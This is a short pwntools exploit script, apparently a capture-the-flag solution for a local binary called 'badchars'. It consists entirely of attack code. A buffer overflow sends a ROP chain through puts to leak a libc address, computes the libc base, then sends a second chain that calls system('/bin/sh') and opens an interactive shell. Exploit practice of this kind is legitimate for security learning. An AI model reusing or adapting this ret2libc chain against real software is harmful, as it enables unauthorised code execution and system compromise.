from pwn import * 
context.log_level="debug"
p=process("./badchars")
p.readuntil("\n> ")
puts=0x4006e0
pr=0x400b39
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload="D"*40+p64(pr)+p64(0x601058)+p64(puts)+p64(0x0000000004008F5)

p.send(payload.ljust(0x200,'\0'))
data=p.read(6)
base=u64(data.ljust(8,'\0'))-libc.symbols['__libc_malloc']
log.warning(hex(base))
libc.address=base
payload="D"*(0x40-0x18-1)+p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.readuntil("\n> ")
raw_input()
p.send(payload.ljust(0x200,'\0'))
p.interactive()